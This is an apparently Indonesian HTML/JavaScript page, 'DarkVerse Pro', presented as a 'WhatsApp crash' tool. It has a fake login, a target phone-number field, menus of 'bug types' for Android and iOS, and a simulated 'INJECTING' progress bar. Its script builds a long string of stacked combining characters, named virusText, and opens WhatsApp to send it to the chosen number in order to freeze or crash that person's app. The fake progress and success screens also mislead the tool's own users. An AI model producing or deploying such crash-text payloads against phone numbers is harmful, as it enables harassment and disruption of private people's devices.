<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DarkVerse Pro</title>
    <style>
        :root {
            --bg-color: #050b14;
            --card-bg: #0a1624;
            --accent-cyan: #1ebbc3;
            --accent-red: #ff003c;
            --text-gray: #7a8b9a;
            --border-color: #1a2a3a;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: var(--bg-color); color: white;
            font-family: 'Segoe UI', sans-serif; overflow: hidden;
        }

        /* --- SCREEN 1: LOGIN (FIXED STYLE) --- */
        #login-screen {
            position: fixed; inset: 0; background: #000; z-index: 9999;
            display: flex; flex-direction: column; padding: 15px;
        }
        .login-banner {
            width: 100%; height: 260px; position: relative;
            border: 2px solid #330011; border-radius: 25px; overflow: hidden;
            margin-top: 10px; margin-bottom: 25px;
        }
        .video-bg { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; }
        .overlay-content {
            position: absolute; inset: 0; background: rgba(0,0,0,0.3);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        .login-card {
            background: rgba(10, 10, 20, 0.6); border: 1px solid #1a1a2e;
            border-radius: 25px; padding: 25px; box-shadow: 0 0 20px rgba(0,0,0,1);
        }
        .input-login {
            background: rgba(20, 10, 20, 0.8); border: 1px solid #331122;
            padding: 18px; border-radius: 15px; margin-bottom: 15px;
            display: flex; align-items: center; gap: 15px;
        }
        .btn-login-main {
            width: 100%; padding: 18px; border-radius: 15px; border: none;
            background: linear-gradient(90deg, #ff0055, #8800ff);
            color: white; font-weight: bold; font-size: 1.1rem;
            box-shadow: 0 0 15px rgba(255, 0, 85, 0.4); margin-bottom: 20px;
        }
        .btn-sub {
            flex: 1; padding: 12px; border-radius: 12px; font-weight: bold; font-size: 0.8rem;
            display: flex; align-items: center; justify-content: center; gap: 5px; background:#0a0a0a; border:1px solid #ff0055;
        }

        /* --- SCREEN 2: DASHBOARD --- */
        .app-container {
            display: none; width: 100%; height: 100vh; flex-direction: column;
            overflow-y: auto; padding: 15px 15px 120px 15px;
        }
        .page { display: none; }
        .page.active { display: block; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .header-wa { text-align: center; font-size: 1.5rem; font-weight: bold; letter-spacing: 4px; padding-bottom: 20px; color: #fff; text-shadow: 0 0 10px var(--accent-red); }
        .main-card {
            background: #080808; border: 1px solid var(--accent-red); border-radius: 18px;
            padding: 20px; display: flex; align-items: center; position: relative; margin-bottom: 20px;
        }
        .video-box { width: 100%; border-radius: 20px; overflow: hidden; margin-bottom: 20px; border: 1px solid #222; aspect-ratio: 16/9; }
        .form-section { background: #0a0a0a; border-radius: 20px; padding: 20px; border: 1px solid #1a1a1a; }
        .input-box { background: #000; border: 1px solid #222; padding: 15px; border-radius: 12px; margin: 10px 0 20px; display: flex; align-items: center; }
        input, select { background: transparent; border: none; color: white; width: 100%; outline: none; font-size: 1rem; }

        .btn-send {
            width: 100%; background: var(--accent-red); color: white; border: none;
            padding: 15px; border-radius: 12px; font-weight: bold; text-transform: uppercase;
        }

        /* CUSTOM NOTIF MODAL */
        #custom-modal {
            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9);
            z-index: 10002; align-items: center; justify-content: center; backdrop-filter: blur(5px);
        }
        .modal-content {
            background: #0d0d0d; border: 1px solid var(--accent-red); width: 85%; max-width: 320px;
            padding: 30px 20px; border-radius: 25px; text-align: center;
            box-shadow: 0 0 30px rgba(255, 0, 60, 0.4);
        }

        .btn-wa-target {
            width: 100%; padding: 15px; background: #25D366; color: black;
            border: none; border-radius: 12px; font-weight: bold; margin-top: 15px;
            text-transform: uppercase; cursor: pointer;
        }

        #loading-overlay {
            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9);
            z-index: 10001; flex-direction: column; align-items: center; justify-content: center;
        }
        .loader { width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid var(--accent-red); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        .bottom-nav {
            position: fixed; bottom: 15px; left: 15px; right: 15px;
            background: rgba(10, 20, 30, 0.9); backdrop-filter: blur(15px);
            border: 1px solid #222; border-radius: 25px;
            display: flex; justify-content: space-around; padding: 12px; z-index: 1000;
        }
    </style>
</head>
<body>

<div id="custom-modal">
    <div class="modal-content">
        <span style="font-size:3rem;">☣️</span>
        <div style="font-weight:bold; margin:15px 0 5px; color:white;">BUG SENT SUCCESS!</div>
        <div id="success-desc" style="font-size:0.8rem; color:var(--text-gray); margin-bottom:10px;"></div>
        
        <button class="btn-wa-target" onclick="redirectToWA()">KE WA TARGET</button>
        
        <button onclick="closeModal()" style="width:100%; padding:10px; background:transparent; border:1px solid #444; color:white; border-radius:10px; margin-top:10px;">CLOSE</button>
    </div>
</div>

<div id="loading-overlay">
    <div class="loader"></div>
    <div id="status-text" style="color:var(--accent-red); margin-top:20px; font-size:0.75rem; font-weight:bold; letter-spacing:2px;">INJECTING...</div>
    <div style="width:150px; height:2px; background:#111; margin-top:10px;"><div id="progress-fill" style="width:0%; height:100%; background:var(--accent-red); transition:0.3s;"></div></div>
</div>

<div id="login-screen">
    <div class="login-banner">
        <video class="video-bg" autoplay loop muted playsinline><source src="https://files.catbox.moe/kfoji0.mp4" type="video/mp4"></video>
        <div class="overlay-content">
            <h1 style="letter-spacing:4px; margin:0; text-shadow: 0 0 15px #ff0055;">DARK VERSE</h1>
            <div style="margin-top:20px; border: 1px solid #ff0055; padding:5px 15px; border-radius:10px; font-size:0.7rem;">DARK VERSE V1</div>
        </div>
    </div>
    <div class="login-card">
        <div class="input-login"><span>👤</span><input type="text" id="usn" placeholder="USERNAME" style="background:none; border:none; color:white; width:100%; outline:none;"></div>
        <div class="input-login"><span>🔑</span><input type="password" id="pws" placeholder="PASSWORD" style="background:none; border:none; color:white; width:100%; outline:none;"></div>
        <button class="btn-login-main" onclick="doLogin()">LOGIN</button>
        <div style="display:flex; gap:10px;">
            <div class="btn-sub"><span style="color:#ff0055;">💀</span> MUSIC</div>
            <div class="btn-sub" style="background:linear-gradient(90deg, #8800ff, #ff0055); border:none; color:white;">🔥 ORDER</div>
        </div>
    </div>
</div>

<div class="app-container" id="main-app">
    <div id="wa-page" class="page active">
        <div class="header-wa">DarkVerse</div>
        <div class="main-card">
            <div style="width:50px; height:50px; border-radius:50%; border:1px dashed var(--accent-red); display:flex; align-items:center; justify-content:center; margin-right:15px; color:var(--accent-red);">👾</div>
            <div>
                <h2 style="margin:0; font-size:1rem; color:var(--accent-red);">WHATSAPP CRASH</h2>
                <p style="margin:5px 0 0; font-size:0.7rem; color:var(--text-gray);">v4.0 Final Stable</p>
            </div>
            <div style="position:absolute; right:15px; border:1px solid var(--accent-red); padding:3px 10px; border-radius:10px; font-size:0.6rem; color:var(--accent-red);">OWNER</div>
        </div>

        <div class="video-box">
            <video autoplay loop muted playsinline style="width:100%; height:100%; object-fit:cover;"><source src="https://files.catbox.moe/kfoji0.mp4" type="video/mp4"></video>
        </div>

        <div class="form-section">
            <label style="color:var(--accent-red); font-size:0.75rem; font-weight:bold;">TARGET NUMBER</label>
            <div class="input-box" id="target-ui">📱<input type="number" id="targetNumber" placeholder="628xxxxxxxxxx" style="margin-left:10px"></div>
            
            <label style="color:var(--accent-red); font-size:0.75rem; font-weight:bold;">SELECT BUG TYPE</label>
            <div class="input-box">
                <select id="payloadType">
                    <option>[ ⊗ DIRAIN KUOTA 𝒯 ]</option>
                    <option>[ ⊗ CRASH ANDROID ]</option>
                    <option>[ ⊗ CRASH IOS 17 ]</option>
                    <option>[ ⊗ DELAY SCRIPT ]</option>
                    <option>[ ⊗ BUG UI GHOST ]</option>
                </select>
            </div>
            <button class="btn-send" onclick="processBug()">Kirim Bug Now</button>
        </div>
    </div>
</div>

<div class="bottom-nav">
    <div style="color:var(--text-gray); font-size:0.6rem;">🏠<br>Home</div>
    <div style="color:var(--accent-red); font-size:0.6rem;">💬<br>WA</div>
    <div style="color:var(--text-gray); font-size:0.6rem;">🛠️<br>Tools</div>
</div>

<script>
    let currentTarget = "";

    function doLogin() {
        const u = document.getElementById('usn').value;
        const p = document.getElementById('pws').value;
        if(u && p) {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('main-app').style.display = 'flex';
        } else { alert("Login failed!"); }
    }

    function processBug() {
        currentTarget = document.getElementById('targetNumber').value;
        if (!currentTarget || currentTarget.length < 5) {
            document.getElementById('target-ui').style.borderColor = "red";
            return;
        }

        document.getElementById('loading-overlay').style.display = 'flex';
        let p = 0;
        const itv = setInterval(() => {
            p += 10;
            document.getElementById('progress-fill').style.width = p + '%';
            if(p >= 100) {
                clearInterval(itv);
                setTimeout(() => {
                    document.getElementById('loading-overlay').style.display = 'none';
                    document.getElementById('success-desc').innerText = "Target: " + currentTarget;
                    document.getElementById('custom-modal').style.display = 'flex';
                }, 500);
            }
        }, 300);
    }

    function redirectToWA() {
        const virusText = "ɪɴɪ.ʜᴀɪ ɪᴍ ᴅᴀʀᴋ ʙᴇʀsᴇ ʏᴀɴx ɪᴢɪɴ l̷̢̨̨̫̼͙̞͉̗͉̖̲̖̞̿̉ẹ̷͓̺̰̽̍͛̉̐̔͋̓̚͜ŵ̵̨̢̳̞̤̝̖̠̘̩̞̘̭͍̘̐́̈͑̈́̐̂̔̽̓͋̂̔ͅâ̸̙͐͑̌̿͛̽t̵̏͛̃̍́̈̚͜͝ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸̙͐͑̌̿͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜â̸͐͑̌̿wmwm̙͛̽ȟ̸̨̯̲̝̳͓͎̭͖͊̄̔̽̓̂̋̇̋̀̕̚͜";
        window.location.href = "https://wa.me/" + currentTarget + "?text=" + encodeURIComponent(virusText);
    }

    function closeModal() { document.getElementById('custom-modal').style.display = 'none'; }
</script>

</body>
</html>
